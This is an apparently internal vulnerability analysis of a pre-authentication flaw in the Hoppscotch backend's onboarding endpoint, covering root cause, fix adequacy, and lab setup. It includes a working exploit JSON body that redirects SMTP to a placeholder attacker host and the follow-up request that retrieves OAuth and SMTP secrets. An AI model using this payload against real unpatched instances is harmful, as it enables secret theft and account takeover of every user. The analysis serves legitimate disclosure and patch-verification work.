# Vulnerability Analysis: CVE-2026-28215

## CVE ID
CVE-2026-28215

## Severity
- **CVSS**: 9.1 (CRITICAL) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
- **CWE**: CWE-284 (Improper Access Control), CWE-287 (Improper Authentication)

---

## Root Cause

The `OnboardingController` in Hoppscotch self-hosted backend exposes three REST endpoints under `/v1/onboarding/` that are protected **only by a rate-limiting guard** (`ThrottlerBehindProxyGuard`) — no JWT authentication, no admin authorization, no session validation:

```typescript
// onboarding.controller.ts (lines 24-25)
@Controller({ path: 'onboarding', version: '1' })
@UseGuards(ThrottlerBehindProxyGuard)  // ONLY rate limiting — NO JwtAuthGuard, NO RESTAdminGuard
export class OnboardingController { ... }
```

The critical vulnerability is in `POST /v1/onboarding/config` (the `updateOnboardingConfig` handler, line 62). This endpoint:

1. **Accepts arbitrary infrastructure configuration** — OAuth client IDs/secrets, SMTP credentials, callback URLs, auth provider lists
2. **Has no authentication** — Any remote unauthenticated attacker can call it
3. **Has no onboarding-already-completed check** — Does not verify whether onboarding was already performed
4. **Generates and returns a recovery token** — This token can then be used to read back ALL sensitive configuration via `GET /v1/onboarding/config?token=<token>`

This means that on any deployed, fully configured Hoppscotch self-hosted instance, an unauthenticated remote attacker can overwrite the entire authentication infrastructure (OAuth credentials, SMTP settings) and exfiltrate existing secrets — in a single HTTP POST request.

### Technical Flow

1. **Entry Point**: `POST /v1/onboarding/config` — REST endpoint, no auth
2. **Controller Handler**: `OnboardingController.updateOnboardingConfig()` at `onboarding.controller.ts:62`
3. **Service Method**: `InfraConfigService.updateOnboardingConfig(dto)` at `infra-config.service.ts:528`
   - Generates `onboardingRecoveryToken = crypto.randomUUID()` (line 529)
   - Builds config entries from user-supplied DTO + forces `ONBOARDING_COMPLETED=true` + `ONBOARDING_RECOVERY_TOKEN=<new-uuid>` (lines 531-546)
   - Validates config values via `validateEnvValues()` — format validation only, no auth (line 548)
   - Verifies SMTP/auth provider consistency (lines 552-578)
   - Calls `updateMany(configEntries, false)` — the `false` bypasses the disallowed-keys check (line 582)
   - Returns `{ token: <recovery-uuid> }` in response (lines 585-587)

4. **Secret Exfiltration**: The returned token is then used with `GET /v1/onboarding/config?token=<token>` (also unauthenticated) to read back all OAuth secrets, SMTP passwords, and callback URLs.

---

## Vulnerable File(s) and Function(s)

### Primary — Controller (missing auth + missing state check)
- **File**: `packages/hoppscotch-backend/src/infra-config/onboarding.controller.ts`
- **Function**: `updateOnboardingConfig()` — lines 62-80
- **Class-level**: Lines 24-25 (controller decorator with only `ThrottlerBehindProxyGuard`)

### Secondary — Service (no internal authorization check)
- **File**: `packages/hoppscotch-backend/src/infra-config/infra-config.service.ts`
- **Function**: `updateOnboardingConfig()` — lines 528-588
- **Note**: `updateMany()` called with `checkDisallowedKeys=false` (line 582), bypassing the normal restriction on updating sensitive fields like `VITE_ALLOWED_AUTH_PROVIDERS` and `MAILER_SMTP_ENABLE`

### Related — GET config endpoint (unauthenticated secret retrieval)
- **File**: `packages/hoppscotch-backend/src/infra-config/onboarding.controller.ts`
- **Function**: `getOnboardingConfig()` — lines 82-105
- **Service**: `InfraConfigService.getOnboardingConfig()` — lines 595-611
- **Note**: Also unauthenticated, token-gated only. The token is provided by the POST exploit.

---

## Triggering Input

### Minimum Payload — Single HTTP POST

The vulnerability is triggered by a single unauthenticated HTTP POST request to `/v1/onboarding/config` with a JSON body conforming to the `SaveOnboardingConfigRequest` DTO.

**Minimum required field** (enforced by `@IsString()` non-optional validator):
- `VITE_ALLOWED_AUTH_PROVIDERS` — must be a valid comma-separated list of auth providers (values: `GOOGLE`, `GITHUB`, `MICROSOFT`, `EMAIL`)

**Full exploit payload** (to hijack email authentication and SMTP):
```json
{
  "VITE_ALLOWED_AUTH_PROVIDERS": "EMAIL",
  "MAILER_SMTP_ENABLE": "true",
  "MAILER_USE_CUSTOM_CONFIGS": "true",
  "MAILER_SMTP_HOST": "attacker-smtp.example.com",
  "MAILER_SMTP_PORT": "587",
  "MAILER_SMTP_SECURE": "true",
  "MAILER_SMTP_USER": "attacker@example.com",
  "MAILER_SMTP_PASSWORD": "attacker-password",
  "MAILER_ADDRESS_FROM": "noreply@attacker.example.com",
  "MAILER_TLS_REJECT_UNAUTHORIZED": "true"
}
```

**Validation requirements** (enforced by `validateEnvValues`):
- `MAILER_SMTP_ENABLE`, `MAILER_USE_CUSTOM_CONFIGS`, `MAILER_SMTP_SECURE`, `MAILER_TLS_REJECT_UNAUTHORIZED`: must be `"true"` or `"false"`
- `MAILER_ADDRESS_FROM`: must pass `validateSMTPEmail()` — valid email format
- `MAILER_SMTP_HOST`, `MAILER_SMTP_PORT`, `MAILER_SMTP_USER`, `MAILER_SMTP_PASSWORD`: must be non-empty strings
- `VITE_ALLOWED_AUTH_PROVIDERS`: must be valid provider names (`EMAIL`, `GOOGLE`, `GITHUB`, `MICROSOFT`)
- If auth provider is specified, its required config fields must also be provided and valid

### Secret Exfiltration Request
After the POST, the response includes `{ "token": "<uuid>" }`. Use this token:
```
GET /v1/onboarding/config?token=<uuid>
```
This returns all OAuth client secrets, SMTP passwords, and callback URLs in plaintext.

---

## Attack Scenario

### Prerequisites
- Hoppscotch self-hosted instance at version < 2026.2.0
- Instance has completed initial onboarding (configured and in production use)
- Attacker has network access to the backend API (default port 3170)

### Step-by-Step Attack

1. **Reconnaissance**: Attacker sends `GET /v1/onboarding/status` (unauthenticated) to confirm `onboardingCompleted: true` — confirming the target is a configured production instance.

2. **Configuration Overwrite**: Attacker sends `POST /v1/onboarding/config` with attacker-controlled SMTP credentials and/or OAuth client settings. The server:
   - Generates a new `onboardingRecoveryToken` (UUID)
   - Overwrites ALL provided config entries in the `InfraConfig` database table
   - Sets `ONBOARDING_COMPLETED=true`
   - Returns `201 Created` with `{ "token": "<recovery-uuid>" }`
   - Triggers application restart (via `stopApp()` in `updateMany`)

3. **Secret Exfiltration**: Attacker sends `GET /v1/onboarding/config?token=<recovery-uuid>` to retrieve ALL infrastructure secrets including:
   - Previously configured OAuth client IDs and secrets (Google, GitHub, Microsoft)
   - OAuth callback URLs
   - SMTP host, port, user, password
   - Mailer configuration
   - All auth provider settings

4. **Account Takeover**: With control of SMTP and/or OAuth infrastructure:
   - Redirect magic-link login emails through attacker SMTP → capture login tokens
   - Replace OAuth client credentials → capture OAuth tokens during SSO login
   - Replace OAuth callback URLs → redirect auth flows to attacker servers
   - Result: Complete takeover of all user authentication flows

---

## Impact

1. **Infrastructure Configuration Overwrite**: Complete replacement of OAuth and SMTP configuration for the Hoppscotch instance
2. **Secret Exfiltration**: Read back all existing secrets (OAuth client secrets, SMTP passwords) via the recovery token
3. **OAuth Hijacking**: Replace legitimate OAuth credentials with attacker-controlled ones, capturing all SSO login tokens
4. **Email Interception**: Redirect magic-link authentication emails through attacker SMTP infrastructure
5. **Full Account Takeover**: Complete control over authentication flows for ALL users of the instance
6. **Denial of Service**: After overwrite, the application restarts and legitimate auth may break

---

## Authentication Requirements

**None — the vulnerability is pre-authentication.**

The `POST /v1/onboarding/config` endpoint has no authentication guard. The only guard on the controller is `ThrottlerBehindProxyGuard` (rate limiting based on IP, default 100 requests per 60 seconds).

The `GET /v1/onboarding/config` endpoint is also unauthenticated but requires a valid recovery token (returned by the POST exploit).

The `GET /v1/onboarding/status` endpoint is also unauthenticated and returns boolean status information.

### Rate Limiting Details
- Guard: `ThrottlerBehindProxyGuard` extends `ThrottlerGuard`
- Default: 100 requests per 60 seconds per IP
- Extracts IP from `req.ips[0]` or `req.ip`
- This is trivially bypassable: the exploit requires only 2-3 requests total

---

## Fix Assessment

### Fix Details (commit `a1be60da`)

The fix adds an onboarding state check at the beginning of the `updateOnboardingConfig` controller handler:

```typescript
// Added check before processing the request
const onboardingStatus = await this.infraConfigService.getOnboardingStatus();
if (E.isLeft(onboardingStatus))
  throwHTTPErr({ message: onboardingStatus.left, statusCode: HttpStatus.UNPROCESSABLE_ENTITY });

if (onboardingStatus.right.onboardingCompleted && !onboardingStatus.right.canReRunOnboarding)
  throwHTTPErr({ message: ONBOARDING_CANNOT_BE_RERUN, statusCode: HttpStatus.BAD_REQUEST });
```

Where:
- `onboardingCompleted` = `configMap.ONBOARDING_COMPLETED === 'true'`
- `canReRunOnboarding` = `usersCount === 0`

The fix also wraps `getOnboardingStatus()` in a try/catch with a new `INFRA_CONFIG_FETCH_FAILED` error.

### Assessment: Fix is adequate for the stated vulnerability

**What the fix does well:**
- Blocks the attack on any configured instance with existing users (the primary threat scenario)
- Uses a server-side state check that cannot be tampered with by the client
- The `usersCount === 0` exception allows legitimate first-time setup and recovery scenarios
- Error handling improved with try/catch in `getOnboardingStatus()`

**What the fix does NOT do (design choices, not flaws):**
- Does not add JWT/admin authentication to the endpoint — this is by design since the endpoint must work during initial setup when no admin account exists
- Does not protect the `GET /v1/onboarding/status` or `GET /v1/onboarding/config` endpoints — status returns non-sensitive booleans; config requires a valid recovery token
- Does not add CSRF protection — rate limiting is the only defense against abuse

**The fix adequately prevents the core exploit (re-running onboarding to overwrite config on a production instance).** There are no identified bypass vectors for the primary vulnerability.

---

## Potential Bypass Vectors

No concrete bypass vectors were identified for the primary vulnerability. The fix correctly blocks re-running onboarding when `onboardingCompleted=true && usersCount > 0`.

### Theoretical Considerations (not exploitable)

1. **Race condition on user deletion**: If an admin deletes ALL users while attacker sends the POST, `canReRunOnboarding` could briefly be `true`. This is an impractical scenario requiring privileged access coordination.

2. **Empty-token leak on fresh instances**: The `GET /v1/onboarding/config?token=` with an empty token string could match the default null recovery token (cast to `''` by the `cast()` method). This would expose .env-configured secrets on fresh instances before onboarding. This is a design weakness in the GET endpoint (not addressed by the CVE fix) but the impact is limited — on a fresh instance, there are typically no secrets beyond what's in the .env file itself.

---

## Related Attack Surface

### 1. GET /v1/onboarding/status — Information Disclosure (by design)
- **File**: `onboarding.controller.ts:29-55`
- **Issue**: Unauthenticated, returns `{ onboardingCompleted: boolean, canReRunOnboarding: boolean }`
- **Impact**: Low — reveals whether instance is configured, useful for attacker reconnaissance
- **Note**: This is by design for the onboarding UI and not a security vulnerability

### 2. GET /v1/onboarding/config — Token-gated Secret Retrieval
- **File**: `onboarding.controller.ts:82-105` / `infra-config.service.ts:595-611`
- **Issue**: Unauthenticated, protected only by recovery token validation
- **Impact**: Medium — if attacker obtains token (via POST exploit), all OAuth/SMTP secrets are exposed
- **Note**: The DTO filtering (`excludeExtraneousValues: true`) limits exposure to OAuth and SMTP fields only — JWT_SECRET, SESSION_SECRET, and other internal secrets are NOT exposed through this endpoint

### 3. Contrast with Protected Endpoints
- **`SiteController`** (`infra-config.controller.ts:12-47`): Uses `@UseGuards(JwtAuthGuard, RESTAdminGuard)` for all endpoints ✓
- **`InfraResolver`** (`infra.resolver.ts`): Uses `@UseGuards(GqlAuthGuard, GqlAdminGuard)` for all queries/mutations ✓
- The `OnboardingController` is the only infra-config controller without proper authentication

### 4. No Other Files Share the Same Pattern
The vulnerability pattern (missing auth guard on sensitive state-modifying endpoint) is specific to `OnboardingController`. All other controllers that modify infra config use `JwtAuthGuard + RESTAdminGuard` (REST) or `GqlAuthGuard + GqlAdminGuard` (GraphQL). No sibling controllers or parallel implementations share this flaw.

---

## Data Exposed via GET /v1/onboarding/config

The `GetOnboardingConfigResponse` DTO (with `excludeExtraneousValues: true`) limits exposure to these fields:

| Field | Sensitivity |
|-------|------------|
| VITE_ALLOWED_AUTH_PROVIDERS | Low — auth provider list |
| GOOGLE_CLIENT_ID, GOOGLE_CLIENT_SECRET | **HIGH** — OAuth credentials |
| GOOGLE_CALLBACK_URL, GOOGLE_SCOPE | Medium — OAuth config |
| GITHUB_CLIENT_ID, GITHUB_CLIENT_SECRET | **HIGH** — OAuth credentials |
| GITHUB_CALLBACK_URL, GITHUB_SCOPE | Medium — OAuth config |
| MICROSOFT_CLIENT_ID, MICROSOFT_CLIENT_SECRET | **HIGH** — OAuth credentials |
| MICROSOFT_CALLBACK_URL, MICROSOFT_SCOPE, MICROSOFT_TENANT | Medium — OAuth config |
| MAILER_SMTP_ENABLE, MAILER_USE_CUSTOM_CONFIGS | Low — boolean flags |
| MAILER_SMTP_URL | **HIGH** — may contain credentials in URL |
| MAILER_SMTP_HOST, MAILER_SMTP_PORT | Medium — server location |
| MAILER_SMTP_USER, MAILER_SMTP_PASSWORD | **HIGH** — SMTP credentials |
| MAILER_SMTP_SECURE, MAILER_TLS_REJECT_UNAUTHORIZED | Low — boolean flags |
| MAILER_ADDRESS_FROM | Low — email address |

**NOT exposed**: JWT_SECRET, SESSION_SECRET, SESSION_COOKIE_NAME, TOKEN_SALT_COMPLEXITY, ONBOARDING_RECOVERY_TOKEN, RATE_LIMIT_*, ACCESS_TOKEN_VALIDITY, REFRESH_TOKEN_VALIDITY, MAGIC_LINK_TOKEN_VALIDITY, ANALYTICS_*, IS_FIRST_TIME_INFRA_SETUP, USER_HISTORY_STORE_ENABLED, MOCK_SERVER_WILDCARD_DOMAIN

---

## Build System

- **Package Manager**: pnpm (monorepo workspace)
- **Runtime**: Node.js 20.x (Dockerfile specifies `node:20.12.2`)
- **Framework**: NestJS (TypeScript)
- **Build Tool**: `@nestjs/cli` (`nest build`)
- **ORM**: Prisma (PostgreSQL)

## Build Commands

```bash
# Install dependencies
npm i -g pnpm
pnpm install --filter hoppscotch-backend

# Generate Prisma client
cd packages/hoppscotch-backend
DATABASE_URL=postgresql://placeholder:placeholder@localhost:5432/placeholder pnpm exec prisma generate

# Build
pnpm run build
# Equivalent to: nest build && cp -r src/mailer/templates dist/mailer/templates

# Run database migrations
DATABASE_URL=postgresql://postgres:testpass@hoppscotch-db:5432/hoppscotch pnpm exec prisma migrate deploy

# Start production server
pnpm run start:prod
# Equivalent to: node dist/main
```

## Dependencies

### System
- Node.js 20.x
- PostgreSQL 15

### Node.js (key packages)
- `@nestjs/core`, `@nestjs/common` — NestJS framework
- `@nestjs/swagger` — OpenAPI docs
- `@prisma/client`, `prisma` — PostgreSQL ORM
- `pg` — PostgreSQL driver
- `@nestjs/passport`, `passport-*` — Authentication (Google, GitHub, Microsoft OAuth)
- `@nestjs/jwt` — JWT tokens
- `@nestjs/throttler` — Rate limiting
- `fp-ts` — Functional Either monad
- `class-validator`, `class-transformer` — DTO validation
- `nodemailer`, `@nestjs-modules/mailer` — Email
- `argon2`, `bcrypt` — Password hashing
- `express` — HTTP server (v5)

## Runtime Requirements

### Services
- **PostgreSQL 15**: Database for all application data
  - Connection: `postgresql://postgres:testpass@hoppscotch-db:5432/hoppscotch`
  - User: `postgres`, Password: `testpass`, DB: `hoppscotch`

### Required Environment Variables
- `DATABASE_URL` — PostgreSQL connection string
- `DATA_ENCRYPTION_KEY` — 32-character string for encrypting secrets in DB
- `WHITELISTED_ORIGINS` — CORS allowed origins (can use `*` for testing)

### Optional But Useful Environment Variables
- `PORT` — Backend port (default: 3170)
- `TRUST_PROXY` — Set `true` if behind reverse proxy
- `VITE_BASE_URL` — Frontend URL
- `VITE_BACKEND_API_URL` — Backend API URL

### Network
- Backend listens on port 3170 (configurable via PORT env var)
- Vulnerable endpoint: `POST http://<host>:3170/v1/onboarding/config`
- Status endpoint: `GET http://<host>:3170/v1/onboarding/status`
- Config retrieval: `GET http://<host>:3170/v1/onboarding/config?token=<uuid>`

### Docker Setup
- Existing Dockerfile at `packages/hoppscotch-backend/Dockerfile` (builder → dev/prod multi-stage)
- Existing `docker-compose.yml` at repo root with PostgreSQL + migration services
- Simplest lab: use `docker-compose --profile default up` for AIO setup
- Or build backend separately with PostgreSQL sidecar

### Initial State for PoC
The PoC needs the instance to have completed initial onboarding (to simulate a production-configured instance). This can be achieved by:
1. Starting the backend
2. Running initial onboarding via `POST /v1/onboarding/config` with valid config
3. Creating at least one user (to match production scenario)
4. Then demonstrating the exploit re-runs onboarding to overwrite config

Alternatively, configure via .env and set `ONBOARDING_COMPLETED=true` in the database directly.
